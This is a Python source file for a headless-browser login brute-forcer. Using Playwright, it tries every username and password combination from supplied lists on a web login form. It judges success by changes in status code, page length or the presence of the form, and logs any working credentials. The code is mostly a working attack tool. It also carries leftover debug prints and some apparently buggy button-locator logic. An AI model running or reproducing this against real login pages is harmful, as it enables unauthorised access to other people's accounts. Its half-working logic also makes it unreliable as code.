import logging
import sys
import webParser
import requests
from bs4 import BeautifulSoup
import ssl
from html_similarity import style_similarity, structural_similarity, similarity
from lxml import html
from playwright.async_api import async_playwright 

class headless:
    def __init__(self, url, web_parser,  pass_user):
        self.url = url
        self.web_parser = web_parser
        self.pass_user = pass_user
        
        
    async def brute(self):
        """
        sends all combinations for usernames and passwords to the attack function on the login page
        """
        p = await async_playwright().start()
    
        browser = await p.firefox.launch()
        page = await browser.new_page()
        await page.goto(self.url)

        await page.wait_for_load_state()
        if 'value' in self.web_parser.button:
            self.web_parser.button = await page.locator('[value=' + self.web_parser.button['value'] +']')
            self.web_parser.button= await page.locator('input:has-text('+self.web_parser.button.text+'), button:has-text('+self.web_parser.button.text+')').click()

        else:
            self.web_parser.button =page.locator('text=sign in')
        
        for username in self.pass_user['Usernames']:
            for password in self.pass_user['Passwords']:
                content = await self.attack(username, password, page)
                if self.check_login(content):
                    logging.info("login successfull\n\nusername: "+ username+ "\npassword: "+ password)
                    await browser.close()
                    await p.stop()  
                    sys.exit()     
                await page.goto(self.url)
                await page.wait_for_load_state()       
        await browser.close()
        await p.stop()
        

        
    async def attack(self, username, password, page):
        """
        create a packet containing fake headers and the payload(username,password) and submit it to the server
        """

        await page.fill('input[name=' + self.web_parser.user_param +']', username)
        await page.fill('input[name=' +  self.web_parser.password_param +']', password)
        page.once('response', lambda response: self.getResponse(response))

        await self.web_parser.button.click()
        print('55555555555555555555555555lool')


        print('------------------------------lool')
        content = await page.content()
        return content


    def getResponse(self, response):
        print('lol: ' + str(response.status))
        self.status_code = response.status
        
        
        
    def check_login(self, content):
        """
        checks if login was successful by checking if status code changed and checks if form is still in the page
        """
        print('lol: ' + '1')
        if self.status_code >= 400:
            return False

        elif self.status_code != self.web_parser.status_code:
            print(str(self.status_code))
            print(str(self.web_parser.status_code))
            print('lol: ' + '2')
            return True
        
        elif ((abs(len(content) - self.web_parser.contentLen) / self.web_parser.contentLen) * 100.0) >= 20:
            print('lol: ' + '3')
            return True
        
        parser = BeautifulSoup(content, 'html.parser')
        forms = parser.find_all('form')
        if self.web_parser.form not in forms:
            print('lol: ' + '4')
            return True
    


        return False


    ########################################################################################

